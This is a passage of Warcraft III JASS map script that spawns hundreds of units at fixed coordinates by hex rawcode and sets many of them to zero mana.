call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15450.9,-2378.1,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,13635.3,-2341.4,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15530.9,-3644.1,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15452.3,-3946.5,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,15125.2,-5681.,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,11981.5,-446.5,175.52)
set Hu=CreateUnit(Ht,$6E303249,15276.5,-5734.4,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,14243.4,-5261.7,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,14176.4,-4782.9,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,12913.7,-4392.5,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303249,12883.9,-3299.2,175.52)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30324A,11627.7,-2126.7,180.758)
set Hu=CreateUnit(Ht,$6E303344,1933.9,3165.4,322.437)
set Hu=CreateUnit(Ht,$6E303345,4006.5,5701.4,290.202)
set Hu=CreateUnit(Ht,$6E303344,1887.5,6971.8,322.437)
set Hu=CreateUnit(Ht,$6E303344,3484.2,7766.5,322.437)
set Hu=CreateUnit(Ht,$6E303344,5273.4,7055.3,231.614)
set Hu=CreateUnit(Ht,$6E303345,2890.9,8078.7,290.202)
set Hu=CreateUnit(Ht,$6E303345,-131.3,8151.3,290.202)
set Hu=CreateUnit(Ht,$6E303346,2624.,3813.4,7.031)
set Hu=CreateUnit(Ht,$6E303346,1122.7,7783.4,7.031)
set Hu=CreateUnit(Ht,$6E303343,3772.3,6805.1,276.625)
set Hu=CreateUnit(Ht,$6E303343,4494.3,4777.2,77.181)
set Hu=CreateUnit(Ht,$6E303346,4983.2,7214.4,209.747)
set IQ=CreateUnit(Ht,$68303043,-15968.6,15557.3,344.23)
set Hu=CreateUnit(Ht,$6F737733,-14895.6,-7181.,345.831)
set Hu=CreateUnit(Ht,$6F737733,-14617.8,-6284.5,220.748)
set Hu=CreateUnit(Ht,$6F737733,-15763.7,-5627.1,288.924)
set Hu=CreateUnit(Ht,$6F737733,-14963.8,-8543.,112.16)
set Hu=CreateUnit(Ht,$6F737733,-15303.8,-8094.3,312.858)
set Hu=CreateUnit(Ht,$6E303030,-8632.9,1692.6,147.2)
set Hu=CreateUnit(Ht,$6E303044,-14030.1,-12315.7,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-11996.,-10677.6,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30324C,15599.,542.7,212.225)
set Hu=CreateUnit(Ht,$68303446,4448.5,-9088.5,129.082)
set Hu=CreateUnit(Ht,$68303446,4925.3,-9064.6,129.082)
set Hu=CreateUnit(Ht,$6E303044,-14133.,-10520.,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303046,-14065.7,-11298.6,180.43)
set Hu=CreateUnit(Ht,$68303446,4946.2,-9486.4,129.082)
set Hu=CreateUnit(Ht,$68303446,4445.3,-9472.3,129.082)
set Hu=CreateUnit(Ht,$68303446,4030.5,-9492.,129.082)
set Hu=CreateUnit(Ht,$65666F6E,-8650.3,1505.2,323.26)
set Hu=CreateUnit(Ht,$6E303030,-7234.2,-687.,249.957)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$65666F6E,-5660.2,-1000.2,323.26)
set Hu=CreateUnit(Ht,$65666F6E,-6261.7,-2654.2,323.26)
set Hu=CreateUnit(Ht,$65666F6E,-9100.8,-5338.,323.26)
set Hu=CreateUnit(Ht,$65666F6E,-15809.1,-5920.7,323.26)
set Hu=CreateUnit(Ht,$65666F6E,-14629.3,-7337.5,323.26)
set Hu=CreateUnit(Ht,$6E303030,-6308.7,-4570.6,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-7649.3,-5121.5,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-11199.9,-3385.,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-12575.3,-5224.5,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-13860.2,-8087.4,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-14721.1,-6089.8,223.599)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-7073.5,-908.5,180.875)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-7265.1,774.,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-9500.9,171.4,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303030,-4755.8,-2378.7,349.19)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6F737031,-5683.1,-255.1,152.53)
set Hu=CreateUnit(Ht,$6F737031,-7532.4,-5058.3,152.53)
set Hu=CreateUnit(Ht,$6F737031,-11255.3,-3702.8,152.53)
set Hu=CreateUnit(Ht,$6F737031,-11005.,-5954.6,152.53)
set Hu=CreateUnit(Ht,$6F737031,-12196.3,-5186.8,152.53)
set Hu=CreateUnit(Ht,$6F737031,-15155.9,-3865.3,152.53)
set Hu=CreateUnit(Ht,$6E303045,-10358.8,-8544.5,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-11672.6,-9634.6,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-9001.3,-11922.6,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-11848.6,-12622.,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-9061.5,-8869.9,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-10736.1,-14354.2,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-8861.2,-14420.1,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E73626D,-6902.3,-11559.3,232.38)
set Hu=CreateUnit(Ht,$6E303045,-5830.6,-13953.3,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-5922.1,-12475.3,311.48)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303046,-10486.3,-11095.1,180.43)
set Hu=CreateUnit(Ht,$6E303046,-8930.1,-9282.9,180.43)
set Hu=CreateUnit(Ht,$6E303046,-4341.5,-10311.5,180.43)
set Hu=CreateUnit(Ht,$6E303044,-4277.7,-9259.1,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-5849.3,-9993.7,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-6917.2,-9334.1,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-7124.6,-11409.,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-5743.3,-14221.2,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-8546.7,-14481.7,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-9632.,-13484.,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303044,-11437.2,-12503.1,37.12)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E73626D,-10073.6,-9796.2,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-7400.2,-13641.2,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-5750.9,-12544.4,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-4907.6,-11692.9,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-4379.6,-9931.7,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-4556.2,-8961.2,232.38)
set Hu=CreateUnit(Ht,$6E73626D,-5654.8,-9858.8,232.38)
set Hu=CreateUnit(Ht,$6E677277,-6323.6,-7360.7,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-6339.1,-7540.3,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-5895.,-6675.9,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-5602.8,-5937.,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-5672.,-6130.5,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4805.4,-7917.4,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-5039.8,-7886.6,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4705.9,-6294.7,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4860.4,-4955.9,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-4374.4,-4892.4,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E677277,-3945.9,-7847.6,176.17)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E61646B,-2321.3,-7748.6,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-3226.4,-5728.,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2323.1,-5842.,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2796.5,-3762.4,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-3976.9,-3815.2,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-1145.2,-8158.6,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2189.,-9506.4,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2628.5,-10577.1,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-2401.4,-10545.,251.89)
set Hu=CreateUnit(Ht,$6E61646B,-1104.2,-9473.2,251.89)
set Hu=CreateUnit(Ht,$6E627A6B,249.3,-6610.9,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,1356.7,-6466.,233.31)
set Hu=CreateUnit(Ht,$6E627A6B,2109.2,-7267.6,233.31)
set Hu=CreateUnit(Ht,$6F737733,-15523.2,-8573.7,46.461)
set Hu=CreateUnit(Ht,$6E627A6B,604.1,-7642.5,233.31)
set Hu=CreateUnit(Ht,$6E726472,-3625.4,-2225.,91.952)
set Hu=CreateUnit(Ht,$6E726472,-3712.1,-1020.9,303.589)
set Hu=CreateUnit(Ht,$6E726472,-3584.6,431.2,34.28)
set Hu=CreateUnit(Ht,$6E726472,-1588.2,1279.5,168.546)
set Hu=CreateUnit(Ht,$6E73626D,-7817.9,-12272.1,314.592)
set Hu=CreateUnit(Ht,$6E303047,-621.8,637.9,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,66.4,1834.7,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,313.2,2116.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303045,-7004.1,-12340.5,229.901)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1338.2,1277.3,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1986.1,265.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,2170.6,-57.2,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,2584.3,-1502.7,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,1559.3,-2936.4,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,2235.6,-2789.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,731.,-3963.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,207.9,-3121.5,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,244.1,-400.,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303047,160.5,-88.8,312.31)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,22384.2,12441.1,336.994)
set Hu=CreateUnit(Ht,$6E6A6762,-4730.1,1303.1,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-3697.1,3648.3,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E6A6762,-961.9,6492.,227.67)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-3265.7,6174.,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,-1794.5,4898.3,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E737277,515.4,5995.,296.18)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E676772,-1046.2,6246.4,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E676772,-485.,4018.4,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E676772,-1968.2,3413.5,203.77)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E626473,21735.,12313.8,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303343,166.2,7975.8,77.181)
set Hu=CreateUnit(Ht,$6E303343,2105.8,3501.2,77.181)
set Hu=CreateUnit(Ht,$6E62646F,22132.6,12273.6,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303343,3906.6,3880.9,77.181)
set Hu=CreateUnit(Ht,$6E62646D,20673.1,12465.3,336.994)
set Hu=CreateUnit(Ht,$6E303346,3485.2,6880.8,209.747)
set Hu=CreateUnit(Ht,$6E626473,20863.6,12143.9,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303346,1948.6,6702.6,209.747)
set Hu=CreateUnit(Ht,$6E303346,3768.1,5452.,209.747)
set Hu=CreateUnit(Ht,$6E303344,4690.5,4984.1,231.614)
set Hu=CreateUnit(Ht,$6E303344,3721.6,3679.3,231.614)
set Hu=CreateUnit(Ht,$6E303058,-9089.4,4091.6,46.21)
set Hu=CreateUnit(Ht,$6E62646F,20421.5,12297.8,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,20684.1,10832.4,336.994)
set Hu=CreateUnit(Ht,$6E303058,-12869.4,7244.7,46.21)
set Hu=CreateUnit(Ht,$6E626473,20874.7,10511.,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303058,-6977.4,6833.3,46.21)
set Hu=CreateUnit(Ht,$6E303058,-9832.6,8002.6,46.21)
set Hu=CreateUnit(Ht,$75303032,-8090.6,8051.3,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,20432.5,10664.9,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-9036.3,5359.7,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-12611.6,5820.7,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$75303032,-5287.6,5729.4,80.06)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303059,-5532.,7617.1,97.59)
set Hu=CreateUnit(Ht,$6E303059,-6562.7,7574.3,97.59)
set Hu=CreateUnit(Ht,$6E303059,-9072.1,6783.7,97.59)
set Hu=CreateUnit(Ht,$6E303059,-7343.,3186.,97.59)
set Hu=CreateUnit(Ht,$6E303059,-10512.1,5490.9,97.59)
set Hu=CreateUnit(Ht,$6E62646D,19763.5,9967.9,336.994)
set Hu=CreateUnit(Ht,$6E303159,-8964.1,14318.8,188.015)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-11027.1,12403.6,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-11332.2,12477.,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-12341.7,12372.9,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E626473,19954.1,9646.6,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30315A,-11284.,10739.3,130.489)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$68303446,3930.3,-9615.8,129.082)
set Hu=CreateUnit(Ht,$6E62646F,19511.9,9800.4,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303157,-152.4,11855.5,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,19113.1,10542.6,336.994)
set Hu=CreateUnit(Ht,$6E303157,2195.9,14255.8,31.938)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,1392.,13684.3,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,665.4,8830.7,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,365.3,10345.9,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,-7595.4,12011.8,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,2999.3,14369.2,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303158,-9666.9,10189.,277.446)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-11966.,11337.5,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E626473,19303.6,10221.3,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-8775.6,14336.9,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-7812.3,15169.2,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-2947.1,10654.7,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,-2327.6,10409.8,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,92.9,12270.,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,2942.,14004.,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E303155,1512.3,9126.8,5.208)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344C,10360.3,1882.1,240.696)
set Hu=CreateUnit(Ht,$6E30344D,12632.6,-360.4,320.811)
set Hu=CreateUnit(Ht,$6E62646F,18861.5,10375.1,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,19172.5,9791.1,336.994)
set Hu=CreateUnit(Ht,$6E30344E,10079.5,-2779.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,10468.9,-2782.7,223.007)
set Hu=CreateUnit(Ht,$6E30344E,11281.4,-3008.4,223.007)
set Hu=CreateUnit(Ht,$6E30344E,10910.1,-4221.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,9571.9,-3572.4,223.007)
set Hu=CreateUnit(Ht,$6E626473,19363.,9469.8,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,18920.9,9623.6,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,17864.6,11440.9,336.994)
set Hu=CreateUnit(Ht,$6E30344E,8869.2,-2227.1,223.007)
set Hu=CreateUnit(Ht,$6E626473,18055.2,11119.6,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,17613.,11273.4,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344E,8290.8,-3584.5,223.007)
set Hu=CreateUnit(Ht,$6E30344E,8580.9,-4836.8,223.007)
set Hu=CreateUnit(Ht,$6E30344E,6866.1,-4098.2,223.007)
set Hu=CreateUnit(Ht,$6E62646D,17786.2,12392.5,336.994)
set Hu=CreateUnit(Ht,$6E30344E,6292.5,-3852.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,5287.,-3703.,223.007)
set Hu=CreateUnit(Ht,$6E30344E,5174.5,-3518.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,5873.1,-6004.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,5905.5,-6243.2,223.007)
set Hu=CreateUnit(Ht,$6E30344E,6352.9,-5977.6,223.007)
set Hu=CreateUnit(Ht,$6E30344E,7004.5,-5290.,223.007)
set Hu=CreateUnit(Ht,$6E626473,17976.7,12071.2,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344E,7964.,-5659.6,223.007)
set Hu=CreateUnit(Ht,$6E30344E,7435.1,-6315.,223.007)
set Hu=CreateUnit(Ht,$6E30344E,8608.5,-6557.1,223.007)
set Hu=CreateUnit(Ht,$6E62646F,17534.6,12225.,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344E,10474.5,-6194.9,223.007)
set Hu=CreateUnit(Ht,$6E62646D,17996.3,13102.6,336.994)
set Hu=CreateUnit(Ht,$6E30344E,10064.8,-5477.3,223.007)
set Hu=CreateUnit(Ht,$6E30344E,11056.6,-5407.9,223.007)
set Hu=CreateUnit(Ht,$6E30344D,14564.8,428.6,320.811)
set Hu=CreateUnit(Ht,$6E30344D,14944.7,1171.3,320.811)
set Hu=CreateUnit(Ht,$6E626473,18186.9,12781.3,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344D,12571.6,-739.3,172.67)
set Hu=CreateUnit(Ht,$6E30344D,15828.6,302.,320.811)
set Hu=CreateUnit(Ht,$6E62646F,17744.7,12935.1,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646D,19407.8,13028.5,336.994)
set Hu=CreateUnit(Ht,$6E30344D,16052.1,-1557.,320.811)
set Hu=CreateUnit(Ht,$6E30344D,15784.5,-210.2,320.811)
set Hu=CreateUnit(Ht,$6E30344D,15294.9,-2215.,320.811)
set Hu=CreateUnit(Ht,$6E30344D,14444.9,-1634.1,320.811)
set Hu=CreateUnit(Ht,$6E30344D,15140.4,-3774.2,320.811)
set Hu=CreateUnit(Ht,$6E626473,19598.3,12707.2,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344D,13939.6,-5087.9,320.811)
set Hu=CreateUnit(Ht,$6E30344D,15435.8,-5859.2,320.811)
set Hu=CreateUnit(Ht,$6E62646F,19156.2,12861.,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344D,13157.5,-4396.4,320.811)
set Hu=CreateUnit(Ht,$6E30344D,12774.1,-4237.1,320.811)
set Hu=CreateUnit(Ht,$6E62646D,18576.7,14697.1,336.994)
set Hu=CreateUnit(Ht,$6E30344D,12564.7,-3519.7,320.811)
set Hu=CreateUnit(Ht,$6E626473,18767.2,14375.7,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344D,13615.5,-2638.,320.811)
set Hu=CreateUnit(Ht,$6E62646F,18325.1,14529.5,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344C,9047.7,1167.1,240.696)
set Hu=CreateUnit(Ht,$6E62646D,18775.3,15275.3,336.994)
set Hu=CreateUnit(Ht,$6E30344C,9699.2,2460.9,240.696)
set Hu=CreateUnit(Ht,$6E626473,18965.9,14953.9,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344C,11717.6,3292.3,240.696)
set Hu=CreateUnit(Ht,$6E30344C,9699.2,2460.9,240.696)
set Hu=CreateUnit(Ht,$6E30344C,12328.5,1179.7,240.696)
set Hu=CreateUnit(Ht,$68303446,4021.,-10383.9,129.082)
set Hu=CreateUnit(Ht,$6E62646F,18523.7,15107.8,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E30344C,12581.5,2578.5,240.696)
set Hu=CreateUnit(Ht,$6E30344C,12581.5,2578.5,240.696)
set Hu=CreateUnit(Ht,$6E30344C,12804.,4260.3,240.696)
set Hu=CreateUnit(Ht,$6E30344C,11833.6,5269.2,240.696)
set Hu=CreateUnit(Ht,$6E30344C,10585.6,4854.7,240.696)
set Hu=CreateUnit(Ht,$6E62646D,23847.6,13618.4,336.994)
set Hu=CreateUnit(Ht,$6E30344C,9822.2,3570.3,240.696)
set Hu=CreateUnit(Ht,$6E30344C,8819.2,3260.,240.696)
set Hu=CreateUnit(Ht,$6E30344C,7718.8,3624.8,240.696)
set Hu=CreateUnit(Ht,$6E30344C,8739.4,5199.9,240.696)
set Hu=CreateUnit(Ht,$6E626473,24038.1,13297.,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,23596.,13450.9,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E626473,24014.,13930.2,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,23571.9,14084.,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E626473,23628.7,13975.,196.54)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$6E62646F,23186.5,14128.9,123.04)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$68303446,4273.4,-10622.7,129.082)
set Hu=CreateUnit(Ht,$68303446,4604.8,-10346.9,129.082)
set Hu=CreateUnit(Ht,$68303446,4780.7,-9996.7,129.082)
set Hu=CreateUnit(Ht,$68303446,4991.6,-10636.7,129.082)
set Hu=CreateUnit(Ht,$68303446,4835.5,-11011.1,129.082)
set Hu=CreateUnit(Ht,$68303446,4707.2,-11618.6,129.082)
set Hu=CreateUnit(Ht,$68303446,4281.2,-11637.1,129.082)
set Hu=CreateUnit(Ht,$68303446,4206.4,-11094.6,129.082)
set Hu=CreateUnit(Ht,$68303446,3857.6,-11035.7,129.082)
set Hu=CreateUnit(Ht,$68303446,3823.4,-11983.4,129.082)
set Hu=CreateUnit(Ht,$68303446,3860.5,-12149.6,129.082)
set Hu=CreateUnit(Ht,$68303446,4332.4,-12146.4,129.082)
